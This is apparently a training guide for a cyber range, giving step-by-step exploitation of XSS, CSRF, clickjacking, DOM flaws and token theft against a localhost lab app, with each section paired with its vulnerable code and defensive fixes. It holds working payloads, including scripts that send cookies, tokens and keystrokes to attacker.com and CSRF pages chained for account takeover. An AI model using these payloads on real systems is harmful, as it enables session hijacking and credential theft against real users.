# W Corp Cyber Range - UI-Based Attacks Guide

## 📚 Table of Contents

1. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
2. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
3. [Clickjacking](#clickjacking)
4. [DOM-Based Vulnerabilities](#dom-based-vulnerabilities)
5. [Session Storage Attacks](#session-storage-attacks)
6. [Browser Developer Tools Exploitation](#browser-developer-tools-exploitation)

---

## Cross-Site Scripting (XSS)

### 🎯 Overview

**Cross-Site Scripting (XSS)** allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser context, allowing session hijacking, credential theft, and malicious redirects.

### 🔍 Vulnerability Locations

- Error messages that reflect user input
- Profile pages displaying user data
- URL parameters reflected in the page
- File upload with HTML/SVG files
- Search functionality

### 📖 Types of XSS

1. **Stored XSS** - Malicious script stored in database
2. **Reflected XSS** - Script reflected from URL parameters
3. **DOM-Based XSS** - Script manipulates the DOM directly
4. **File-Based XSS** - Via uploaded HTML/SVG files

### 🔓 Step-by-Step Exploitation

#### Attack 1: Stored XSS via Username (Registration)

```bash
# Register with XSS payload in username
curl -X POST http://localhost:3000/wcorp/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "<img src=x onerror=alert(\"XSS\")>",
    "password": "test123",
    "email": "xss@test.com"
  }'
```

**Result:** When other users view your profile or the username is displayed, the JavaScript executes.

#### Attack 2: Reflected XSS via URL Parameters

```javascript
// Visit this URL (if error messages reflect input)
http://localhost:3000/wcorp/login?error=<script>alert(document.cookie)</script>

// Or with event handlers
http://localhost:3000/wcorp/search?q=<img src=x onerror=alert('XSS')>

// URL encoded version
http://localhost:3000/wcorp/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E
```

#### Attack 3: XSS via File Upload (HTML File)

```bash
# Create malicious HTML file
cat > steal-cookies.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Invoice Document</title>
</head>
<body>
    <h1>Loading document...</h1>
    <script>
        // Steal cookies
        fetch('https://attacker.com/steal?cookie=' + document.cookie);
        
        // Steal localStorage tokens
        fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
        
        // Keylogger
        document.addEventListener('keypress', function(e) {
            fetch('https://attacker.com/log?key=' + e.key);
        });
        
        // Redirect to phishing page
        setTimeout(() => {
            window.location = 'https://attacker.com/fake-login';
        }, 3000);
    </script>
</body>
</html>
EOF

# Upload the file
curl -X POST http://localhost:3000/wcorp/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@steal-cookies.html"

# Share the link with victims
# http://localhost:3000/uploads/steal-cookies.html
```

#### Attack 4: XSS via SVG Upload

```bash
# Create malicious SVG
cat > xss.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    <![CDATA[
    // Execute arbitrary JavaScript
    alert('XSS via SVG!');
    
    // Steal authentication token
    var token = localStorage.getItem('token');
    fetch('https://attacker.com/steal?token=' + token);
    
    // Perform actions as the victim
    fetch('/wcorp/api/user/update', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + token,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: 'hacked@attacker.com'
        })
    });
    ]]>
  </script>
  <circle cx="100" cy="100" r="50" fill="red"/>
  <text x="100" y="105" text-anchor="middle" fill="white">Click Me!</text>
</svg>
EOF

# Upload SVG
curl -X POST http://localhost:3000/wcorp/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@xss.svg"
```

#### Attack 5: DOM-Based XSS

```javascript
// If the application uses dangerouslySetInnerHTML or innerHTML
// Open browser console on the site and execute:

// Inject script via DOM manipulation
const div = document.createElement('div');
div.innerHTML = '<img src=x onerror="alert(document.cookie)">';
document.body.appendChild(div);

// Modify existing elements
document.querySelector('.username').innerHTML = '<img src=x onerror="alert(\'XSS\')">';

// Via URL hash
// Navigate to: http://localhost:3000/wcorp/#<img src=x onerror=alert(1)>
// If the app reads location.hash without sanitization
```

#### Attack 6: Cookie Stealing via XSS

```javascript
// Complete cookie stealing payload
const payload = `
<script>
(function() {
    // Steal all cookies
    var cookies = document.cookie;
    
    // Steal localStorage
    var storage = JSON.stringify(localStorage);
    
    // Steal session storage
    var session = JSON.stringify(sessionStorage);
    
    // Send to attacker server
    var img = new Image();
    img.src = 'https://attacker.com/steal?' +
        'cookie=' + encodeURIComponent(cookies) +
        '&local=' + encodeURIComponent(storage) +
        '&session=' + encodeURIComponent(session) +
        '&url=' + encodeURIComponent(window.location.href);
})();
</script>
`;

// Inject this payload via any XSS vector
```

### 💡 What Makes This Vulnerable?

**Vulnerable React Code:**
```javascript
// UserProfile.js - Unsafe rendering
function UserProfile() {
  const [userData, setUserData] = useState({});
  
  return (
    <div>
      {/* DANGEROUS - Renders HTML from user data */}
      <div dangerouslySetInnerHTML={{ __html: userData.bio }} />
      
      {/* Also vulnerable if data contains HTML */}
      <h2>{userData.username}</h2>  {/* If username has <script> tags */}
    </div>
  );
}

// Error messages reflecting user input
function LoginPage() {
  const error = new URLSearchParams(window.location.search).get('error');
  
  return (
    <div>
      {/* Vulnerable if error parameter contains script */}
      <div className="alert">{error}</div>
    </div>
  );
}
```

### 🛡️ How to Fix

**Secure React Code:**
```javascript
// Use React's built-in XSS protection
function UserProfile() {
  const [userData, setUserData] = useState({});
  
  return (
    <div>
      {/* React automatically escapes HTML */}
      <div>{userData.bio}</div>
      
      {/* Sanitize if you must use HTML */}
      <div dangerouslySetInnerHTML={{ 
        __html: DOMPurify.sanitize(userData.bio) 
      }} />
      
      {/* Always escape user data */}
      <h2>{escapeHtml(userData.username)}</h2>
    </div>
  );
}

// Sanitization function
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Content Security Policy in index.html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; object-src 'none';">

// Set HttpOnly cookies (server-side)
res.cookie('session', token, {
  httpOnly: true,  // Prevents JavaScript access
  secure: true,    // HTTPS only
  sameSite: 'strict'
});
```

---

## Cross-Site Request Forgery (CSRF)

### 🎯 Overview

**CSRF** tricks authenticated users into performing unwanted actions on a web application where they're authenticated. Attackers craft malicious requests that execute using the victim's session.

### 🔍 Vulnerability Locations

- Any state-changing operation without CSRF protection
- Password change endpoints
- Profile update endpoints
- File upload forms
- Admin actions

### 🔓 Step-by-Step Exploitation

#### Attack 1: Change User Email via CSRF

```html
<!-- Create malicious page: csrf-email-change.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Free Prize!</title>
</head>
<body>
    <h1>Congratulations! Click to claim your prize!</h1>
    
    <!-- Hidden form that submits automatically -->
    <form id="csrf-form" method="POST" action="http://localhost:3000/wcorp/api/user/update" style="display:none;">
        <input type="hidden" name="email" value="hacked@attacker.com">
    </form>
    
    <script>
        // Auto-submit when page loads
        document.getElementById('csrf-form').submit();
    </script>
    
    <!-- Or use AJAX -->
    <script>
        // If victim is logged in, their cookies will be sent
        fetch('http://localhost:3000/wcorp/api/user/update', {
            method: 'POST',
            credentials: 'include',  // Include cookies
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: 'hacked@attacker.com'
            })
        });
    </script>
</body>
</html>
```

**Attack Flow:**
1. Attacker hosts `csrf-email-change.html` on their server
2. Attacker sends link to victim: `https://attacker.com/csrf-email-change.html`
3. Victim clicks link while logged into W Corp
4. Victim's email is changed without their knowledge

#### Attack 2: CSRF File Upload

```html
<!-- csrf-upload.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Loading...</h1>
    
    <form id="upload-form" method="POST" action="http://localhost:3000/wcorp/api/upload" enctype="multipart/form-data">
        <input type="file" name="file" id="file-input">
    </form>
    
    <script>
        // Create malicious file
        const blob = new Blob(['<script>alert("XSS from CSRF upload")</script>'], { type: 'text/html' });
        const file = new File([blob], "malicious.html", { type: 'text/html' });
        
        // Create FormData
        const formData = new FormData();
        formData.append('file', file);
        
        // Submit with victim's credentials
        fetch('http://localhost:3000/wcorp/api/upload', {
            method: 'POST',
            credentials: 'include',
            body: formData
        }).then(response => response.json())
          .then(data => {
              // Attacker gets the uploaded file URL
              console.log('Uploaded:', data);
          });
    </script>
</body>
</html>
```

#### Attack 3: CSRF via Image Tag

```html
<!-- Very simple CSRF using GET request -->
<img src="http://localhost:3000/wcorp/api/user/delete?id=5" style="display:none;">

<!-- Works if the API accepts GET for state-changing operations -->
```

#### Attack 4: CSRF Chain Attack

```html
<!-- Multi-step CSRF attack -->
<!DOCTYPE html>
<html>
<body>
    <h1>Loading your content...</h1>
    
    <script>
        async function csrfAttack() {
            // Step 1: Change email
            await fetch('http://localhost:3000/wcorp/api/user/update', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: 'hacked@attacker.com' })
            });
            
            // Step 2: Request password reset (goes to new email)
            await fetch('http://localhost:3000/wcorp/api/reset-password', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: 'hacked@attacker.com' })
            });
            
            // Step 3: Upload backdoor
            const file = new File(['backdoor code'], 'backdoor.html');
            const formData = new FormData();
            formData.append('file', file);
            
            await fetch('http://localhost:3000/wcorp/api/upload', {
                method: 'POST',
                credentials: 'include',
                body: formData
            });
            
            // Redirect to hide attack
            window.location = 'http://localhost:3000/wcorp';
        }
        
        csrfAttack();
    </script>
</body>
</html>
```

### 💡 What Makes This Vulnerable?

**Vulnerable Backend Code:**
```javascript
// No CSRF protection!
app.post('/api/user/update', authenticateToken, async (req, res) => {
  const { email } = req.body;
  const userId = req.user.userId;
  
  // Accepts any request with valid auth token
  // No check for CSRF token or same-origin
  await db.execute(
    'UPDATE users SET email = ? WHERE id = ?',
    [email, userId]
  );
  
  res.json({ success: true });
});
```

### 🛡️ How to Fix

**Secure Backend Code:**
```javascript
const csrf = require('csurf');

// 1. Add CSRF middleware
const csrfProtection = csrf({ cookie: true });
app.use(csrfProtection);

// 2. Provide CSRF token to frontend
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// 3. Validate CSRF token on state-changing operations
app.post('/api/user/update', authenticateToken, csrfProtection, async (req, res) => {
  const { email } = req.body;
  const userId = req.user.userId;
  
  // CSRF token automatically validated by middleware
  await db.execute(
    'UPDATE users SET email = ? WHERE id = ?',
    [email, userId]
  );
  
  res.json({ success: true });
});

// 4. Use SameSite cookies
app.use(session({
  cookie: {
    sameSite: 'strict',  // or 'lax'
    httpOnly: true,
    secure: true
  }
}));
```

**Secure Frontend Code:**
```javascript
// Fetch CSRF token
const [csrfToken, setCsrfToken] = useState('');

useEffect(() => {
  fetch('/api/csrf-token')
    .then(res => res.json())
    .then(data => setCsrfToken(data.csrfToken));
}, []);

// Include CSRF token in requests
const updateEmail = async (email) => {
  await fetch('/api/user/update', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken  // Include token
    },
    body: JSON.stringify({ email })
  });
};
```

---

## Clickjacking

### 🎯 Overview

**Clickjacking** tricks users into clicking something different from what they perceive, potentially revealing confidential information or allowing unauthorized actions.

### 🔓 Step-by-Step Exploitation

#### Attack 1: Basic Clickjacking

```html
<!-- clickjack.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone!</title>
    <style>
        #target-site {
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0.0001;  /* Nearly invisible */
            width: 800px;
            height: 600px;
            z-index: 2;
        }
        
        #fake-button {
            position: absolute;
            top: 200px;
            left: 300px;
            z-index: 1;
            padding: 20px 40px;
            background: #4CAF50;
            color: white;
            font-size: 24px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="fake-button">
        Click here to win a FREE iPhone! 🎁
    </div>
    
    <!-- Hidden iframe with actual site -->
    <iframe id="target-site" src="http://localhost:3000/wcorp/admin/delete-all"></iframe>
    
    <!-- User thinks they're clicking "Win iPhone" but actually clicking "Delete All" -->
</body>
</html>
```

#### Attack 2: Likejacking (Social Media)

```html
<!-- likejack.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Amazing Video!</title>
    <style>
        #facebook-iframe {
            position: absolute;
            top: 250px;
            left: 400px;
            opacity: 0;  /* Completely hidden */
            z-index: 999;
        }
        
        #play-button {
            position: absolute;
            top: 250px;
            left: 400px;
            font-size: 100px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Click play to watch this amazing video!</h1>
    <div id="play-button">▶️</div>
    
    <!-- Hidden Facebook like button iframe -->
    <iframe id="facebook-iframe" 
            src="https://www.facebook.com/plugins/like.php?href=attacker-page">
    </iframe>
</body>
</html>
```

#### Attack 3: Drag & Drop Clickjacking

```html
<!-- drag-drop-attack.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Desktop Cleanup Tool</title>
    <style>
        #dropzone {
            width: 400px;
            height: 300px;
            border: 2px dashed #ccc;
            text-align: center;
            padding: 100px;
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 1;
        }
        
        #hidden-iframe {
            position: absolute;
            top: 100px;
            left: 100px;
            opacity: 0;
            z-index: 999;
            width: 400px;
            height: 300px;
        }
    </style>
</head>
<body>
    <h1>Drag files here to clean them</h1>
    <div id="dropzone">
        Drop files here to remove viruses
    </div>
    
    <!-- Hidden iframe with file upload -->
    <iframe id="hidden-iframe" src="http://localhost:3000/wcorp/upload"></iframe>
</body>
</html>
```

### 💡 What Makes This Vulnerable?

No protection against being embedded in iframes.

### 🛡️ How to Fix

**Backend Security Headers:**
```javascript
// Prevent clickjacking with X-Frame-Options
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');  // or 'SAMEORIGIN'
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
  next();
});
```

**Frontend Frame Busting:**
```javascript
// Add to index.html or App.js
if (window.top !== window.self) {
  window.top.location = window.self.location;
}
```

---

## DOM-Based Vulnerabilities

### 🔓 Exploitation Examples

#### Attack 1: DOM XSS via URL Hash

```javascript
// If application reads location.hash
// Visit: http://localhost:3000/wcorp/#<img src=x onerror=alert(document.cookie)>

// Vulnerable code that might exist:
const hash = window.location.hash.substr(1);
document.getElementById('content').innerHTML = hash;  // XSS!
```

#### Attack 2: Open Redirect

```javascript
// If app has redirect functionality
// Visit: http://localhost:3000/wcorp/redirect?url=https://evil.com

// Phishing attack:
// Send email: "Your W Corp account needs verification"
// Link: http://localhost:3000/wcorp/redirect?url=https://fake-wcorp.com/login
// Users trust the domain but get redirected to phishing site
```

#### Attack 3: DOM Clobbering

```html
<!-- If page vulnerable to HTML injection -->
<img name="userAuth" src="x">
<form name="isAdmin"></form>

<script>
// Now these DOM elements override JavaScript variables
console.log(window.userAuth);  // Returns the img element
console.log(window.isAdmin);   // Returns the form element

// Can break security checks
if (window.isAdmin) {  // Always true now!
    // Show admin panel
}
</script>
```

---

## Session Storage Attacks

### 🔓 Exploitation via Browser Console

#### Attack 1: Token Theft

```javascript
// Open browser console on the site (F12)

// 1. Steal JWT token
const token = localStorage.getItem('token');
console.log('Stolen token:', token);

// 2. Decode JWT to see user info
const payload = JSON.parse(atob(token.split('.')[1]));
console.log('User info:', payload);

// 3. Use token to make requests as the user
fetch('/wcorp/api/admin/users', {
    headers: {
        'Authorization': 'Bearer ' + token
    }
}).then(r => r.json()).then(console.log);

// 4. Export all localStorage
const allData = {};
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    allData[key] = localStorage.getItem(key);
}
console.log('All stored data:', allData);
```

#### Attack 2: Token Manipulation

```javascript
// Open console
const token = localStorage.getItem('token');

// Decode token
const parts = token.split('.');
const payload = JSON.parse(atob(parts[1]));

// Modify payload (won't work with signature verification)
payload.role = 'admin';
payload.userId = 1;

// Re-encode (will fail signature check unless secret is known)
const newPayload = btoa(JSON.stringify(payload));
const newToken = parts[0] + '.' + newPayload + '.' + parts[2];

// Try to use modified token
localStorage.setItem('token', newToken);
location.reload();
```

#### Attack 3: Session Persistence

```javascript
// Steal token and persist it
const token = localStorage.getItem('token');

// Save to attacker's server
fetch('https://attacker.com/save-token', {
    method: 'POST',
    body: JSON.stringify({ token: token })
});

// Or copy to clipboard
navigator.clipboard.writeText(token);
alert('Token copied! Send it to yourself.');
```

---

## Browser Developer Tools Exploitation

### 🔓 Exploitation Techniques

#### Attack 1: Network Tab - Intercept Requests

```javascript
// 1. Open DevTools (F12) → Network tab
// 2. Perform actions (login, upload, etc.)
// 3. Right-click request → Copy as cURL
// 4. Modify and replay

// Example: Replay login with different credentials
curl 'http://localhost:3000/wcorp/api/login' \
  -H 'Content-Type: application/json' \
  --data-raw '{"username":"admin","password":"admin123"}'
```

#### Attack 2: Console - Hijack Functions

```javascript
// Open console and override functions

// Hijack fetch to log all requests
const originalFetch = window.fetch;
window.fetch = function(...args) {
    console.log('Intercepted fetch:', args);
    return originalFetch.apply(this, args);
};

// Hijack form submissions
const forms = document.querySelectorAll('form');
forms.forEach(form => {
    form.addEventListener('submit', (e) => {
        console.log('Form data:', new FormData(form));
    });
});
```

#### Attack 3: Application Tab - Storage Manipulation

```javascript
// Application tab → Storage

// View all cookies
document.cookie.split(';').forEach(c => console.log(c));

// Modify session data
sessionStorage.setItem('isAdmin', 'true');
sessionStorage.setItem('userId', '1');

// Clear competitor's cookies (if XSS exists)
document.cookie.split(";").forEach(c => {
    document.cookie = c.replace(/^ +/, "")
        .replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
});
```

---

## Summary

### UI-Based Attacks Available in W Corp Cyber Range:

| Attack Type | Location | Impact | Difficulty |
|-------------|----------|--------|------------|
| **Stored XSS** | Username field | High | Easy |
| **File-Based XSS** | File upload | Critical | Medium |
| **CSRF** | All POST endpoints | High | Easy |
| **Clickjacking** | Iframe embedding | Medium | Easy |
| **Session Theft** | Browser console | Critical | Very Easy |
| **Token Manipulation** | localStorage | Medium | Medium |
| **DOM XSS** | URL parameters | High | Medium |

### 🔐 Defense Summary

1. **XSS Prevention:**
   - Sanitize all user input
   - Use Content Security Policy
   - Set HttpOnly cookies
   - Use DOMPurify for HTML

2. **CSRF Prevention:**
   - Implement CSRF tokens
   - Use SameSite cookies
   - Validate origin headers

3. **Clickjacking Prevention:**
   - Set X-Frame-Options header
   - Use CSP frame-ancestors
   - Implement frame-busting

4. **Storage Security:**
   - Never store sensitive data in localStorage
   - Use HttpOnly cookies for auth
   - Implement token expiration

### 🎓 Training Exercises

1. **Exercise 1:** Inject XSS via username registration
2. **Exercise 2:** Upload malicious HTML file and execute XSS
3. **Exercise 3:** Create CSRF attack to change user email
4. **Exercise 4:** Steal session token using browser console
5. **Exercise 5:** Create clickjacking page that tricks users
6. **Exercise 6:** Chain XSS + CSRF for complete account takeover

---

**Remember**: These attacks are for educational purposes only in the W Corp Cyber Range training environment!

© 2025 W Corp Cyber Range - Educational Security Training Platform
